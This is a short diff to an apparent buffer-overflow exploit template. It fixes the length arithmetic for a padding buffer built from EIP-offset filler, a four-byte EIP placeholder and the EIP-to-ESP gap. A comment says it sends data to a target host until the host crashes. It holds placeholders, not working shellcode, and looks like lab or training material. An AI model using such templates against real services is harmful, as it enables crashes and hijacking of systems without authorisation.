@@ -15,7 +15,7 @@ filler_to_EIP = "A" * [input length outputed by msf-pattern_offset]
 EIP = "B" * 4
 ## Enter the amount of byte space that seperates EIP and ESP from crash using previous script.
 EIP_to_ESP = "C" * [byte space between EIP and ESP]
-new_buffer = "D" * (size - len(filler_to_EIP + EIP + EIP_to_ESP))
+new_buffer = "D" * (size - (len(filler_to_EIP) + len(EIP) + len(EIP_to_ESP)))
 
 
 # Try statement that will send data until it receives an exception from the target host where it is no longer reachable because we crashed it.
